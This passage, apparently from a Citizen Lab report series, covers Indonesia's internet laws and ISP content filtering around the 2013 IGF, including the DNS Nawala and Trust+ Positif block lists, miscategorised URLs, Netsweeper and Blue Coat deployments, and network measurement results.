other specific receiving or sending information through the Internet. However, in the definition of telecommunication, one can see that although it’s not explicitly mentioned, the transmission of information through the Internet is covered by the law. The definition of telecommunication in article 1(1) of the law is “any broadcasting, sending and or receiving from any information in the form of sign, code, word, picture, sound, and tone through cable system, fiber optic system, radio, or other electromagnetic system.”4 Furthermore, article 4(1) mentions that “the state has authority on telecommunication and the government has power to its development,”5 and therefore, the development of the Internet can be expected to fall under the government’s purview.\nLaw No. 11 of 2008 on Electronic Information and Transactions Law\nLaw No. 11 of 2008 on Electronic Information and Transactions (EIT) was adopted on 21 April 2008. It is the first cyber law in the country and the main instrument for the regulation of online content.\nChapter 7 of the EIT law lists all prohibited acts, which include knowingly and without authority distributing, transmitting, or causing to be accessible in electronic form records containing:\n\nMaterial against propriety (article 27(1));\nGambling material (article 27(2));\nMaterial amounting to affront and/or defamation (article 27(3)); and\nExtortion and/or threats (article 27(4)).\n\nIn 2013, the MCIT said that they will prioritize a revision of the law. Of particular concern is article 27(2) regarding defamation. Gatot S. Dewa Broto, the spokesperson for the MCIT, said that many have judged the penalty of up to six years’ imprisonment and fines of up to IDR 1 billion (approximately USD 106,000) as being too harsh,6 especially because it’s more severe than the provisions contained in the penal code, which specified the penalty of up to nine months’ imprisonment. Our blog post on content control elaborates on how this law, in conjunction with other laws such as Law No. 44 of 2008 on Pornography (the Anti-Pornography Law), the penal code’s articles 207-208, 310-21, and 335 on defamation, and several Indonesian laws prohibiting blasphemy or “defamation of religions,” including Law No. 1/PNPS/1965 (the Presidential Decision), is used for content regulation.\nThe EIT law also contains provisions on interception and wiretapping in article 31(4), which calls for the government to issue a regulation (Peraturan Pemerintah, PP) on the matter. Following a request for judicial review submitted by Anggara, Supriyadi Widodo Eddyono, and Wahyudi Djafar from the Institute of Policy Research and Advocacy (ELSAM), the Constitutional Court annulled article 31(4) because it contradicted articles 28G(1) and 28J(2) of the 1945 constitution. Furthermore, because wiretapping imposes a limit on individual privacy rights, which are a basic human right, the court ruled that it has to be regulated by legislation (Undang Undang) and not merely by government regulation.\nDraft Law on Telematics Convergence\nTo prepare for the convergence of traditional media and new media, the MCIT drafted the Telematics Convergence Law (RUU Konvergensi Telematika), which the government  proposed as an overarching law to the Telecommunications Act, the EIT Law, and the Broadcasting Law governing telecommunications and ICT in Indonesia.\nTelematics is defined broadly as any kind of application that uses the Internet to transmit (e.g., voice, images, data, content-based services, e-commerce, as well as other services provided through applications). The fact that the government drafted a law with such a broad definition of what it is supposed to regulate caused concerns that it will be used to control online content and information. After widespread criticism, the draft Telematics Convergence Law was shelved indefinitely by the MCIT. As an alternative, the People’s Representative Council (Dewan Perwakilan Rakyat, DPR) initiated a draft Broadcasting Law and its deliberation process is underway. If the law passes, a Convergence Law will no longer be necessary.\nDraft Law on Interception Mechanism\nIn Indonesia, there are at least twelve laws, two government regulations, and two ministerial regulations that outline the practice of wiretapping by state institutions in the name of law enforcement. In January 2013, Gatot S. Dewa Broto, the spokesperson for Indonesia’s Ministry of Communications and Information Technology, stated that the government as a whole is preparing a draft law on interception mechanisms (RUU Tata Cara Intersepsi). Our blog post on Internet surveillance elaborates further on the legal and operational problems surrounding wiretapping in Indonesia.\nDraft Law on Information Technology Criminal Offense\nThe People’s Representative Council (DPR) drafted the Information Technology Criminal Offence Law (RUU Tindak Pidana Teknologi Informatika, TIPITI) as a response to the proliferation of cybercrime in Indonesia. When it was first announced to the public, the bill was considered to be a major threat to freedom of expression because many people considered its provisions to be too broad, and to contain worse penalties than those in the controversial Electronic Information and Transactions Law (e.g., up to thirty years in prison and fines up to USD 1,060,000, according to the 2009 draft). Although the bill was considered to be a priority bill in the 2010 National Legislation Program, it was not until 2012 that it was finalized due to pressure from the MCIT. At the time of publication, the law is still waiting to be passed.\nCyber and Regional Security Initiatives\nLike almost all countries today, Indonesia recognizes that cyber security has become a major priority. Indonesia has become a full member of the Asia Pacific Computer Emergency Response Team (APCERT) and FIRST (Forum for Incident Response and Security Team) and a full member and founder of the OIC-CERT (Organization of the Islamic Conference-Computer Emergency Response Team). As of 2010, the draft law on cybercrime and draft law on the ratification of the EU Convention on Cybercrime have been listed in the national legislation program as priorities to be discussed. Whatever the components of that cyber-security strategy will be, it will invariably affect the character of information controls. Indonesia’s cyber-security strategy will reflect both contests among domestic interest groups and stakeholders, as well as the influence of regional and international norms and Indonesia’s participation in regional and other security forums. In particular, the regional alliance — the Association of Southeast Asian Nations (ASEAN), of which Indonesia is a founding member — will be a major influence and source of norms and practices. In September 2013, ASEAN announced that a cyber-security agreement was reached among member states in which Indonesia and other members will jointly develop a mechanism to combat cyber attacks, coordinate trainings, and share threat information — practices that have already begun among some of the region’s CERTs. Along with our colleagues in the region, we will be monitoring these developments closely, especially in light of the impending arrival of the ASEAN Economic Community in 2015. We intend to issue reports on regional cyber-security initiatives in Asia.\nConclusion\nIndonesian information controls cannot be understood without considering the broader social, political, and legal context and the ICT environment within which they are embedded. The nature and character of information controls depend on the market structure of ISPs, telecommunication companies, informal relations, and practices among stakeholders, especially a diverse and politically active civil society, and the legal and policy structures that frame them all. With this backdrop in mind, in two related posts, here and here, we elaborate on the research we undertook while attending the 2013 IGF on content controls and surveillance in Indonesia.\nFootnotes\n1 PowerPoint Presentation by Harijanto Pribadi, Department Head of IIX APJII, https://citizenlab.org/wp-content/uploads/2013/10/IIX-APJII2012-APNIC34-Final.pptx\n2 Totok Sarsito, “The Indonesian Constitution: Why it was amended,” Journal of International Studies, 3 (2007), http://www.myjurnal.my/public/issue-view.php?id=2125&journal_id=217\n3 Kikue Hamayotsu, “The Limits of Civil Society in Democratic Indonesia: Media Freedom and Religious Intolerance”, Journal of Contemporary Asia, 2013, http://dx.doi.org/10.1080/00472336.2013.780471\n4 Article 1 (1) of Law No. 36/1999, http://dittel.kominfo.go.id/wp-content/uploads/2013/06/36-TAHUN-1999.pdf\n5 Article 4 (1) of Law No. 36/1999, http://dittel.kominfo.go.id/wp-content/uploads/2013/06/36-TAHUN-1999.pdf\n6 For more information on Criminal Defamation Law, please see Human Rights Watch’s “Turning Critics into Criminals: The human rights consequences of Criminal Defamation Law in Indonesia.” http://www.hrw.org/sites/default/files/reports/indonesia0510webwcover.pdf\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tIslands of Control, Islands of Resistance: Monitoring the 2013 Indonesian IGF\nDownload the full report here.\nRead the individual sections here:\n\nIGF 2013: Islands of Control, Islands of Resistance: Monitoring the 2013 Indonesian IGF (Foreword)\nIGF 2013: Monitoring Information Controls During the Bali IGF (Framing Post)\nIGF 2013: An Overview of Indonesian Internet Infrastructure and Governance (Part 1 of 4)\nIGF 2013: Analyzing Content Controls in Indonesia (Part 2 of 4)\nIGF 2013: Exploring Communications Surveillance in Indonesia (Part 3 of 4)\nIGF 2013: An Analysis of the 2013 IGF and the Future of Internet Governance in Indonesia (Part 4 of 4)\n\nAs we outlined in our framing post, information controls aim to manage the content accessible to a population, including information posted online. Content controls can include laws and regulations that restrict free speech online or in certain media, as well as technical measures designed to limit access to information — otherwise known as “Internet filtering.” We employ a multidisciplinary mixed-methods approach to study content controls that includes technical testing of government-mandated Internet censorship policies and practices, field research by regional and country-level experts, as well as analyzing the country’s legal and regulatory filtering framework. The combination of technical investigation with political, social, and legal contextual research is essential for understanding both how and why information controls are applied. We also aim to determine the specific techniques and, where possible, the products that are used to implement Internet content filtering.\nIndonesia is a prime example of a country where mixed methods provide essential insight into the scope, scale, and character of content controls. As we described earlier, the country is characterized by a highly distributed and very competitive media environment in which Internet service providers (ISPs), civil society stakeholders, and government ministries engage in a sometimes contentious debate over what content should be filtered, by whom, under what processes, and according to which laws. The country has significant cultural and religious sensitivities around certain types of content. Although network measurement provides us with a baseline of data, our analysis of the scope, scale, and character of Indonesian content controls is greatly enriched by local knowledge of the Internet and cyberspace environment in the country, parts of which are explained in our infrastructure and governance post.\nBuilding on past network measurements, as well as legal and policy analyses undertaken by the OpenNet Initiative, we set out to better understand the current situation. Our analysis is set in the context not only of the 2013 IGF, but amid increasingly intense debates about free expression and access to information, and rapid technological change and development.\nWhile the detailed results of our analysis and technical tests are outlined below, our main findings can be summarized like this:\n\nImplementation of Internet filtering in Indonesia is decentralized (in both policy and technical processes). Although the Indonesian government sets broad expectations and “rules” (sometimes informally communicated) about what content should be filtered by ISPs, and is moving toward standardizing telecommunication laws that would more systematically regulate content control practices, the actual control of content today is left primarily to ISPs’ discretion.\n\n\nReflecting the decentralized nature of the ISP environment, our research detected a range of Internet filtering devices and software, and a diversity of content-control practices being used on different ISPs. Some use the government-promoted systems DNS Nawala and Trust+ Positif, while others use different systems. For example, we found one ISP using Netsweeper, a content-filtering service manufactured by a Canadian company based in Guelph, Ontario.\n\n\nWe also detected the presence of devices manufactured by California-based Blue Coat systems. We detected Packetshaper devices, which have the ability to monitor and control network traffic, on the two biggest Indonesian IPS, Telkom Indonesia and Indosat. We also found CacheFlow on Telkom Indonesia — an appliance whose primary function is to optimize bandwidth by caching but it can also be configured to block content.\n\n\nAlthough formally and officially, Indonesia requires pornography and gambling-related content to be blocked, we found that Indonesian ISPs apply content controls on content related not only to these areas of speech, but also to religious issues and religious advocacy groups, and content related to sexuality and gender (e.g., local LGBT community websites), among other content categories. We found that ISPs are inconsistent regarding the precise nature of content that they target for filtering.\n\n\nCitizens are prevented from accessing content that doesn’t fall within objectionable content on ISPs which rely on evidently error-prone mechanisms to categorize website URLs. We provide evidence that websites of academic institutions and government agencies are categorized on a Trust+ Positif URL list as “porn,” which results in these websites being blocked on ISPs relying on these URL lists.\n\n\nWe ran network measurements on Internet connections provided at the 2013 IGF venue and found that the main network connection for workshop sessions was not filtered (as per the stipulations of the IGF host country agreement). However, backup connections (for public areas of the venue) provided by local Indonesian ISPs (Telkom and Indosat) did filter access to content. We compare these results with measurements from network vantage points outside of the IGF venue.\n\nLegal and Regulatory Frameworks\nAlthough Indonesia’s constitution guarantees freedom of expression under article 28E(3), a number of laws limit freedom of expression online and restrict access to content considered dangerous or socially unacceptable. The penal code and a 1965 blasphemy law that prohibits religious blasphemy are used to limit free expression. But the most prominent laws are the 2008 Electronic Information and Transaction (EIT) Law and the 2008 Anti-Pornography Law. Our blog post on infrastructure and governance explains the nature of these laws in greater detail.\nThe Electronic Information and Transaction Law limits freedom of expression and prohibits defamation. Free speech advocates requested a judicial review of the defamation article in the law, but the Constitutional Court denied the request in 2009. The Anti-Pornography Law was passed in October 2008 amid opposition from various groups who considered the law a threat to the cultural diversity and the rights of minority groups and women in Indonesia.\nThe Anti-Pornography Law, which was aggressively promoted and implemented by many ISPs and Internet cafés in 2010 in an effort to block millions of pornography sites during the holy month of Ramadan, was a major turning point for the country’s filtering policies and practices. At the time, efforts to build more centralized systems, such as DNS-Nawala and Trust+ Positif began to emerge with Indonesian policy-makers promoting their use among ISPs. Meanwhile, the government began installing Trust+ Positif on computers supplied to villages under its Desa Pintar (Smart Village) program. It was also during this period that the Indonesian government threatened to shut down BlackBerry in the country unless it began filtering pornographic content. BlackBerry announced in January 2011 that it would comply with the request and work with carriers to put a filtering solution in place.\nApart from specific invocations of the law, the Indonesian government also pressures ISPs to block websites it defines as extremist in nature. After religious violence erupted in the country in 2011, three hundred websites encouraging greater conflict were blocked as a consequence of this type of pressure. In July 2011, the ICT minister, Tifatul Sembiring, announced plans to filter websites offering illegal downloads of music and videos. He warned that users of these sites could face jail terms and heavy fines for illegal downloading. Individuals with intimate knowledge of these processes explain to us that requests to block content are occasionally passed on by government officials in phone calls or in person during meetings with ISPs and telecom employees. In other words, subtle pressures and moral suasion, rather than transparent and publicly accountable laws and regulations, are occasionally the means ministry officials employ to promote compliance.\nAs is the case in a number of other countries, Indonesian policy-makers have been using code words that create concerns of a growing interest in blocking access to or communication of content that is culturally, religiously, or politically offensive. For example, the INSAN Socialization Team of the Ministry of Communications and Information Technology (MCIT) has been actively promoting a “healthy and safe” Internet. The objective of the program is to “socialize a healthy and safe use of Internet to various levels of society in order to avoid misuse and take benefits for society.” Leading up to and during the 2013 IGF, Indonesian policy-makers emphasized the need to consider an “ethical” Internet — a euphemism around which some Indonesian civil society groups and IGF delegates, including the US State Department representative Christopher Painter, raised concerns.\nProsecution of Netizens\nIndonesian laws, rules, and informal directions around content controls are reinforced by occasional prosecution of individuals. The following are some of the more egregious cases.\nThe most prominent case that invoked the Anti-Pornography Law involved pop singer Nazril Irham (also known as “Ariel”), whose homemade explicit videos were circulated on the Internet against his consent in June 2010. He was convicted and sentenced to three-and-a-half years in prison and a fine of USD 28,000, but he was released after serving only two-thirds of his prison sentence for good behaviour. Irham’s conviction, followed by other sex scandals involving local celebrities and politicians, prompted renewed calls for content control by the ICT minister, Tifatul Sembiring, to block access to pornography websites during the Ramadan in 2010. His teams immediately set out to deploy firewalls for more than 2,000 Internet cafés around the country, which he explained as a “race against time” to protect children from harm. Indonesia’s President Susilo Bambang Yudhoyono has also indicated his support for an Internet filter to block pornography.\nOne of the most prominent online defamation cases has been the prosecution of Prita Mulyasari, who was sued by the Omni International Hospital. Mulyasari, a Jakarta-based housewife and mother, communicated her disappointment with Omni Hospital’s service by e-mail to her friends in September 2008, which was forwarded, circulated on electronic mailing lists, and posted online. Once the e-mail became public knowledge, Omni International Hospital responded by filing a criminal complaint and a civil lawsuit against Mulyasari. She was then arrested in May 2009, by the Banten Provincial Prosecutor’s Office and charged under articles 310 and 311 of the penal code regarding defamation and article 27 of the EIT Law. The court had initially found Mulyasari liable in the civil case and ordered her to pay IDR 204 million (approximately USD 22,000) to Omni International. The charge sparked outrage among tens of thousands who joined a Facebook group in her support and held an online fundraising campaign called “Coins for Prita” to help her pay the fine. The campaign raised IDR 650 million or more than three times the amount of the fine. After appealing to the Supreme Court, she was later acquitted of all civil charges in September 2010. At the same time, criminal proceedings were underway, which eventually found her guilty. She was given a suspended sentence of six months’ imprisonment contingent upon good behaviour. Upon appealing in 2012, the Supreme Court overturned the lower court’s decision and quashed the criminal charges.\nIn June 2012, civil servant Alexander Aan was sentenced by a West Sumatra court to two-and-a-half years in prison and fined IDR 100 million (USD 11,100) (or face another two months in prison) for comments considered blasphemous made on his Facebook account and Facebook fan page, titled Ateis Minang (Minang Atheist). Aan’s conviction was justified on the grounds that he had violated the blasphemy provisions of the penal code, as well as article 28 of the Electronic Information and Transaction Law by “spreading racial and religious hatred.”\nTechnical Implementation of Content Controls\nBecause the Internet environment in Indonesia is broadly distributed, the scope and depth of what content is actually filtered can vary between ISPs, leaving users with different Internet experiences depending on where they connect from. Some ISPs even still offer, on occasion, an entirely unfiltered Internet, although that is increasingly rare. We confirmed this variation in both manual and automated network measurements, made from inside and outside the country.\nIn spite of the decentralization, there are also growing tendencies of standardization, if not centralization. For example, a number of national-level systems have emerged that offer filtering services, promoted by the MCIT. ISPs are encouraged to connect to these services as a way to subcontract out the job of Internet filtering and to ensure that ISPs comply with government expectations. Additionally, ISPs have begun to purchase commercial filtering products developed outside of Indonesia, for example those made by Netsweeper and Blue Coat, whose services include categorizing and controlling access to content online, thus taking the burden of maintaining content controls away from ISP administrators. Should more ISPs use these types of services, the existing decentralized architecture of the ISP ecosystem could in practice tend toward a degree of standardized content targeted for filtering, though that is not yet the case today.\nAs part of its national program “Healthy and Safe Internet” the INSAN Socialization Team of the MCIT is endorsing two DNS filtering projects that include configurations and URL lists to standardize content filtering on Indonesian ISPs, Trust+ Positif and DNS Nawala. Currently, the use of these programs is optional. Because ISPs use a variety of filtering systems and techniques, they are inconsistent regarding what content is blocked. During the IGF 2013 meeting, MCIT booths prominently displayed advertisements for and distributed materials about the “Healthy and Safe Internet” program that promotes Trust+ Positif and DNS Nawala (see Figure 1).\n\nFigure 1. Promotional materials for the “Healthy and Safe Internet” program disseminated by the MCIT at their IGF 2013 booth\nDNS-enabled Filtering Initiatives\nPrivate sector associations in Indonesia have made several attempts to standardize content to be filtered and techniques for DNS filtering. Beginning in 2008, the Association of Indonesia’s Internet Cafés (AWARI) started an initiative to standardize filtering across Internet cafés and provide a means for users to report sites for blocking. Prior to 2008, filtering in Internet cafés was decentralized. Standardization of filtering was seen as positive development to ensure that Internet cafés operated on an equal footing.\nThese moves toward standardization were further enhanced with the development of DNS Nawala, an initiative that the MCIT started in November 2009 with the support of AWARI, PT Telkom, and Indonesian political parties in a response to pressures to implement the 2008 Anti-Pornography Law and the introduction of the “Healthy and Safe Internet” (INSAN) program. Standardization of content filtering was seen as a requirement to ensure compliance with the INSAN program. When DNS Nawala was launched, PT Telkom, the largest ISP in Indonesia, agreed to use the program. When PT Telkom announced it would use DNS Nawala, Eddy Kurina (vice president, public and marketing communication) stated that “for the growth and development and improvement of quality of young generation and as part of the Corporate Social Responsibility program, Telkom provides DNS Nawala able to select the internet contents.” The program was set back when network disruptions followed an installation of DNS Nawala on a major Internet Exchange Point.\nThe Indonesian Internet Service Provider Association (Asosiasi Penyelenggara Jasa Internet Indonesia, APJII) has an agreement with DNS Nawala to provide the 250 members of the ISP association with use of the service. As part of this cooperation APJII provides DNS Nalawa with five servers and DNS Nawla in turn gives its block lists to APJII members.\nThe use of DNS Nawala is not compulsory for APJII members. However, in a statement APJII Chairman Sammy Pangerapan cautioned APJII members that they are responsible for content on their networks and the APJII encourages members to use the service.\nTrust+ Positif\nTrust+ Positif is maintained and endorsed by the MCIT, and provides content-filtering capabilities distributed as configuration files and block lists for the popular open source Squid HTTP proxy and the SquidGuard add-on which is an open source implementation of URL access control lists for Squid. Trust+ Positif is another attempt to standardize content filtering in Indonesia and is described as providing access to a “safe and healthy internet by protecting Internet access based on series of lists containing healthy and reliable information.” The system aims to protect society against values, ethics, and morals “that do not fit with the image of the Indonesian nation.”\n\nFigure 2. Ministry of Communication and Information Technology booth at IGF 2013 promoting Trust+ Positif\nTrust+ Positif feeds SquidGuard two URL databases:\n\nDomain List — contains a list of top-level domains. If a domain is found on this list (e.g., facebook.com) then any subdomain or path (e.g., *.facebook.com or www.facebook.com/home.php) which includes the top-level domain will be included.\n\n\nURL List — contains lists of single URLs (e.g., www.facebook.com/pages/Everybody-Draw-Mohammed-Day).\n\nThese lists group URLs and domains into a number of categories:\n\nWhite List (positive/reliable) — This category includes domains and URLs that have been flagged as “positive or trusted” (e.g., government domains).\n\n\nBlack List (negative/filtered) — This category contains URLs and domains with content considered “negative” such as pornography. The black list is divided into three categories: “Study Results and Public Submissions,” “International Pornography,” and “International Open-Proxy.”\n\nThe content of these lists and information about the number of domains and URLs included are made publicly accessible, as Figure 3 illustrates.\nFigure 3. Quantity of URLs and domains in Trust+ Positif databases\nThe Trust+ Positif website includes a submission page that encourages users to participate in the development of URL lists (to blacklist websites for filtering or whitelist for accessibility) by forwarding pages to an e-mail address or filling in a submission form (at the time of publication, this form is described as “under development”). However, how this submission process operates in practice is unclear and the MCIT ultimately decides what to block. No judicial order is required.\nTrust+ Positif URL Miscategorization\nThe Trust+ Positif website provides users with the option to search for information about domain names or URLs that have been registered in the Trust+ Positif URL lists. This search helps users find out whether a domain name or URL has been listed in the Trust+ Positif database, and check for its categorization.\nWe entered URLs of websites containing sexual and pornographic content and the database returned their categorization as “porn” websites. For example, the URL www.playboy.com was returned as “porn,” as Figure 4 shows.\nFigure 4. Trust+ Positif shows categorization of playboy.com as “porn”\nHowever, when we tried URLs of nonpornographic websites that have been found blocked on some Indonesian ISPs, the database returned no data. For example, a search for the website www.faithfreedom.org, which has alternative views on the faith of Islam, returned the message “Tidak ada data” (no data), as can be seen in Figure 5.\nFigure 5. Trust+ Positif reports no data available for the blocked URL faithfreedom.org\nWe analyzed how the Trust+ Positif URL dataset categorizes a sample of URLs and found that there are numerous URL miscategorizations that result in erroneous blocking. We downloaded the block list that categorizes which domains are pornographic — it is publicly available on the Trust+ Positif website. We then searched through the list to find examples of potential miscategorizing. Once completed, we verified that these URLs and domains are currently in the Trust+ Positif URL lists by submitting them to their online URL-checking tool.\nExamples of such miscategorization are provided in Table 1.\n\n\n\nURL\nContent\nCategorization in the Trust+ Positif Database\n\n\nglbtss.colostate.edu\nGLBT Resource Center at Colorado State University\nPorn\n\n\nwww.muslimsconnect.com\nDating website\nPorn\n\n\ngibraltar.gov.uk\nUK government website about Gibraltar\nPorn\n\n\nwww.newspiritchurch.org\nNew Spirit Community Church\nPorn\n\n\nwww.libertyeducationforum.org\nLiberty Education Forum – Think tank from Washington, DC\nPorn\n\n\nwww.civilmarriagecivilright.com\nLBGT social issues and personal site\nPorn\n\n\nwww.equalityforum.com\nLGBT social issues site\nPorn\n\n\nwcl.american.edu/journal/lawrev/49/vol49-5rothenberg.pdf\nAcademic paper about peeping Toms\nPorn (urls)\n\n\nlib.rochester.edu\nLibrary at the University of Rochester\nPorn\n\n\nwww.slowtrains.com\nLiterary journal\nPorn\n\n\nwww.eastcoastcomputers.com\nIT firm from Florida\nPorn\n\n\nwww.lavalife.com\nDating site\nPorn\n\n\n\nTable 1: Examples of URLs miscategorized in the Trust+ Positif database as “porn”\nAlexa ranks the Trust+ Positif website served to users who browse blocked content on certain ISPs (www.internet-positif.org) among the top hundred pages accessed in Indonesia (number 72 on 24 October 2013) which suggests that a significant number of access attempts are served the block page.\nComparison of DNS Nawala and Trust+ Positif Block Lists\nWe compared both DNS Nawala and Trust+ Positif lists of domains that they categorize as pornographic content. The DNS Nawala block list was retrieved at a time in which a misconfiguration of the DNS Nawala website in 2010 allowed for the download of the block list. The Trust+ Positif blocklist was retrieved directly from a public link on their website. We found that the majority of domains listed are common between the two sets of lists. The Trust+ Positif list does not include any additional domains that are included in the DNS Nawala list, while the DNS Nawala list has 205 additional domains that are not in the Trust+ Positif list.\nCanadian and US Commercial URL filtering Products Detected in Indonesia\nNetsweeper\nNetsweeper is a technology company based in Guelph, Ontario, that provides software products used to filter Web content. In previous research, we found that Netsweeper software was deployed to censor political and human-rights-related content at the national level in Pakistan, Qatar, Kuwait, UAE, and Yemen. We searched for signatures of the Netsweeper products in the search engine Shodan, using methods described here, and we found an installation of Netsweeper on the Indonesian ISP PT Excelcomindo Pratama.\nThe Netsweeper control panel appears at http://202.152.254.227:8080/webadmin/start, while the block page is accessible at http://202.152.254.227:8080/webadmin/deny/index.php.\nFigure 6. Netsweeper control panel installed on ISP PT Excelcomindo Pratama\nBlue Coat\nBlue Coat Systems is a California-based provider of network security and optimization appliances. Some of these products can enable network filtering and surveillance. These products include: ProxySG which works with WebFilter, to categorize web pages for filtering; PacketShaper, a cloud-based networking management device that can establish visibility of over six hundred web applications and control undesirable traffic; and CacheFlow, a web-caching appliance that optimizes bandwidth. ProxySG provides “SSL Inspection” services to solve “issues with intercepting SSL for your end-users.” PacketShaper has the ability to monitor and control network traffic: it is integrated with WebPulse, Blue Coat Systems’ real-time network intelligence service that can filter application traffic by content category. CacheFlow can be configured to block content.\nWhile these tools can be used to maintain and secure networks, they can also be used to implement politically motivated restrictions on access to information, and monitor and record private communications. Depending on their end use, these tools can be used to serve legitimate and positive purposes, or purposes resulting in adverse impacts on human rights. This capacity is often referred to as “dual-use,” a term adapted from language used to describe technologies with both civilian and military applications.\nAs part of prior Citizen Lab research that included a combination of wide-area scanning techniques, Shodan queries, and other experimental methods, we found Blue Coat devices on public networks in eighty-three countries (twenty countries with both ProxySG and PacketShaper, fifty-six countries with PacketShaper only, and seven countries with ProxySG only). Among those findings was the presence of PacketShaper on the networks of both Indosat (http://202.155.63.62/login.htm) and Telkom Indonesia (http://203.130.193.156/login.htm) networks. We also found installations of CacheFlow on Telkom (http://180.252.181.1).\nNetwork Measurements\nWe used a variety of techniques for measuring censorship on networks in Indonesia, including client-based tests performed within Indonesia and remote tests through publicly available web proxies and virtual private networks (VPNs).\nClient-based tests: Data were collected by performing synchronized HTTP requests in both a field location (i.e., a location where Web censorship is suspected) and lab location (at the University of Toronto) using customized measurement software written in Python in a client-server model. The lab network acts as a control and is located at a site that does not censor the type of content tested by the measurement software. The field locations included a number of Indonesian ISPs.\nDuring tests the client attempts to access a pre-defined list of URLs simultaneously in the country of interest (the “field”) and in a control network (the “lab”). Tests were conducted on URL lists that consisted of globally sensitive URLs, tested in all regions, and locally sensitive URLs that are specific to Indonesia’s social, political, and cultural context.\nA number of data points are collected for each URL access attempt: HTTP headers and status code, IP address, page body, and in some cases traceroutes and packet captures. A combined process of automated and manual analysis attempts to identify differences in the results returned between the field and the lab to isolate instances of filtering. Because attempts to access websites from different geographic locations can return different data points for innocuous reasons (such as a domain resolving to different IP addresses for load balancing, or displaying content in different languages depending on where a request originates from) a manual inspection of results is often necessary to verify whether inaccessibility is caused by deliberate filtering or mundane network errors.\nIn addition to tests using our measurement software, tests were also run with two other network measurement tools: Netalyzr and OONI-Probe. Netalyzr is a network diagnostic tool developed at the University of California, Berkeley. We ran it to gather additional data about the properties of tested networks. Collin Anderson, an independent researcher who attended the 2013 IGF, also ran tests with OONI-probe (a client-based Internet censorship measurement tool developed by the Tor project) and contributed his results to this post.\nRemote tests: We ran tests of website accessibility using publicly available Indonesian web proxies and VPNs. The purpose of these tests was to help develop our URL-testing lists for client-based measurements.\n2008-2010 Network Measurement Results\nBetween 2008 and 2010 we ran client-based network measurements on twenty different ISPs in Indonesia. The results of this testing show significant decentralization in how Indonesian ISPs technically implement filtering; they also show inconsistency between ISPs in terms of what content is blocked.\nOn Indosat (AS 4795) and XL Axiata (AS 24203) we observed block pages delivered via DNS redirection to IP addresses hosted by each ISP, and we noted that Indosat’s use of block pages began in late 2010. Similarly, we observed XL Axiata implementing a combination of DNS redirection and block pages in 2010, but we lacked longitudinal data about this ISP.\nIn contrast to Indosat and XL Axiata that display block pages, BIZ Net (AS 17451) implemented DNS redirects that went to non-routable IPs that therefore look like transient failures from the user’s perspective. In 2008, redirects went to IP 0.0.0.1, but in 2009 and onwards we saw this shift to the link-local IP 169.254.1.1 address. Finally, in sixteen different tests over three years, First Media (AS 23700) showed no evidence at all of DNS redirection.\nThe specific content blocked is also inconsistent across ISPs. Pornographic content and gambling websites were regularly blocked by Indonesian ISPs in our sample. However, testing conducted from 2009 to 2010 showed that on some ISPs (e.g., Indosat, XL Axiata) blocked websites included content related to free expression (e.g., www.freespeech.org, an online video network, and www.freespeechcoalition.com, a free speech group), as well as anonymizers and censorship circumvention software. Content related to local LGBT community groups and information portals was also found blocked.\nA summary of historical data that ONI has collected from Indonesia from 2008 to 2010 appears in Figure 7. It shows the ration of blocking behaviours observed on different ISPs in the region. The possible behaviours indicated are:\n\nNo DNS response — when there is no DNS response given in Indonesia, while there is a response in Toronto\n\n\nDNS redirection — when a DNS query redirects to a different IP in Indonesia compared to a DNS query from Toronto\n\n\nNo HTTP response — when an HTTP response is seen in Toronto but not in Indonesia\n\n\nLCRST (low confidence reset) — when the page is retrieved successfully in Toronto (Response code < 400) while a reset packet is observed in Indonesia with no content returning\n\n\nRST (reset) — when LCRST occurs more than three times in a week for the URL in Indonesia\n\n\nBlock page — when a known block page is returned in Indonesia.\n\nFigure 7. Summary of blocking in Indonesia (ISPs with at least 10 blocked URLs per year in at least 2 years). For further technical details regarding how these categories are determined please refer to Table 3, Page 5 in http://www.cs.stonybrook.edu/~phillipa/papers/ONIAnaly.html\n2013 Network Measurement Results\nRemote Measurement Results\nNawala: Testing was conducted using Nawala’s publicly accessible DNS servers (180.131.144.144 and 180.131.145.145) using the same list of URLs used for in-country testing. Two hundred and fifteen URLs from this list of 1,387 URLs resolved to the IP address 180.131.146.7, which is the block page for the Nawala service shown in Figure 8. The full list of URLs tested and found blocked using the Nawala service can be found here.\nThe block page reads (translation from Indonesian):\nThe website you are trying to open cannot be accessed on this network. www.playboy.com is categorized as one of the following:\n\nPorn\n\n\nGambling\n\n\nPhising [sic] /malware\n\n\nSARA [SARA stands for “Suku, Agama, Ras, Antar-golongan,” which refers to content related to ethnicity, religion, race, and intergroup relations].\n\nIf you feel the website that you want to access is erroneously categorized, please contact us via email info@nawala.org\nFigure 8. DNS Nawala blockpage\nClient-based Measurement Results\nClient-based network measurements were run on four ISPs, including three connections provided to delegates at the IGF 2013 venue and one ISP outside of the IGF venue to provide a basis for comparison between content controls at the IGF and those elsewhere in the country.\nISP: TRI\nAS: THREE-AS-ID Hutchison CP Telecommunications, PT\nNetalyzr Results\nTesting was conducted on 22 and 23 October 2013 on the ISP Tri using a 3G mobile connection tethered to a laptop running our client-based measurement software. Test results showed 142 URLs blocked out of the sample of 1,387 URLs we tested. Blocked content spanned twenty-two content categories, including LGBT content, critical religious content, independent media, circumvention tools, sex education sites, gambling, and pornography. A full list of blocked content can be found here.\nBlocked content resolved to a private routable IP address of 10.70.25.111 and displayed a nontransparent block page stating “It works!” The HTML source is identical to the default web page of a fresh installation of the Apache Web server, as Figure 9 illustrates.\nFigure 9. Blockpage and HTML source found on ISP Tri\nIGF Venue Network Measurement Results\nThe Bali Nusa Dua Convention Centre (the venue for the 2013 IGF) provided four wireless connections to participants (SSIDs: IGF 2013, IGF-a, IGF2013.wifi.id, IGF2013@Indosat). See Figure 10.\nFigure 10. Sign describing wireless Internet access points at the IGF 2013 venue\nThe host country agreement signed between the government of Indonesia and the United Nations mandates that an open Internet connection is provided. The primary wireless network, identified by the SSID IGF2013, intended to offer this unfettered access. A network administrator from the organizing committee informed us that “the main wi-fi access managed by [the IGF host] committee is using SSID IGF2013, and we didn’t filter any sites.” A 5 Ghz version of this primary network, with the SSID IGF2013-a, was also made available. Both of these connections rely on bandwidth from Telkomsei and are routed out of the country through that ISP. However, these connections have their own Network Operations Centre (NOC).\nTwo other networks were available at the event and are under the filtering regimes of their respective ISPs: IGF2013@wifi.id is provided by Telkomsei and IGF2013@Indosat is provided by Indosat. These ISPs are the two largest providers in Indonesia and regularly provide connectivity to the Bali Nusa Dua Convention Center where the 2013 IGF and other major events such as the recent 2013 APEC conference summit were held.\nSSID: IGF2013 – IPV6 (2.4 